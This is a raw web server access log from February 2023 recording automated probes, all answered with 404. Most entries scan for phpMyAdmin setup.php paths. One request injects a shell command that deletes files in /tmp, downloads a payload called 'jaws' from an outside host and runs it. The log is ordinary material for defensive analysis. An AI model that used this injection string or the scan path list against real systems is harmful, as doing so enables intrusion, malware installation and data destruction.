5.188.210.227 - - [11/Feb/2023:17:14:14 +0900] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 4684 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
92.84.134.217 - - [11/Feb/2023:17:33:36 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 404 13238 "-" "Hello, world"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/mysqlmanager/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/websql/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/_phpMyAdmin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/typo3/phpmyadmin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/mysql-admin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/admin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/php-myadmin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/SQL/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/php/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpmy-admin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/sqlmanager/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/p/m/a/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/db/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/sqlweb/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/myadmin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/webadmin/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
112.47.34.246 - - [11/Feb/2023:20:56:40 +0900] "GET http://125.204.62.54:80/pma2005/scripts/setup.php HTTP/1.0" 404 13238 "-" "-"
